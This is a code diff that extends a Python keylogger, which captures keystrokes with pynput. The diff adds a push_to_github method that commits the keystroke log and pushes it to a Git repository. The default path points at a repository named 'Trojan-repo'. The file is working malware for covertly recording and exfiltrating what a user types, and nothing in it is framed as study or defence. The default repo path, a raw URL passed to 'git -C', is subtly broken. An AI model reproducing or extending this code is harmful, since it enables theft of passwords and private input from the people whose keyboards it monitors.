@@ -1,12 +1,14 @@
-# keylogger.py
-
 from pynput import keyboard
 from datetime import datetime
 import time
+import subprocess
+
+
 
 class Keylogger:
-    def __init__(self, log_file="keylog.txt"):
+    def __init__(self, log_file="keylog.txt", repo_path= "https://raw.githubusercontent.com/BlertaJashanica/Trojan-repo/main/data/"):
         self.log_file = log_file
+        self.repo_path = repo_path
         self.log = []
         self.listener = keyboard.Listener(on_press=self.on_press)
 
@@ -38,6 +40,20 @@ class Keylogger:
     def stop(self):
         # Stop the listener when finished
         self.listener.stop()
+        # Push the updated log file to GitHub
+        self.push_to_github()
+
+    def push_to_github(self):
+        """Pushes the log file to a GitHub repository."""
+        try:
+            subprocess.run(["git", "-C", self.repo_path, "add", self.log_file], check=True)
+            subprocess.run(["git", "-C", self.repo_path, "commit", "-m", "Update keylog file"], check=True)
+            subprocess.run(["git", "-C", self.repo_path, "push"], check=True)
+            print("Log file pushed to GitHub repository.")
+        except subprocess.CalledProcessError as e:
+            self.log_error(f"Git operation failed: {e}")
+        except Exception as e:
+            self.log_error(f"Unexpected error during Git operation: {e}")
 
     @staticmethod
     def log_error(message):
@@ -45,15 +61,17 @@ class Keylogger:
         with open("error_log.txt", "a") as error_file:
             error_file.write(f"{datetime.now()}: {message}\n")
 
-security_tool = Keylogger()
-# Voorbeeld van de Keylogger module
+# Replace "./" with the path to your local Git repository
+repo_path = "./"
+security_tool = Keylogger(repo_path=repo_path)
+
 print("Starting keylogger (run for 10 seconds)...")
 security_tool.start()
 
 print("Keylogger is running... Press keys to test it.")
 
-# Run de keylogger voor 10 seconden voor testdoeleinden
+# Run the keylogger for 10 seconds for testing purposes
 time.sleep(10)
 
-# Stop de keylogger en beëindig het programma
+# Stop the keylogger and end the program
 security_tool.stop()
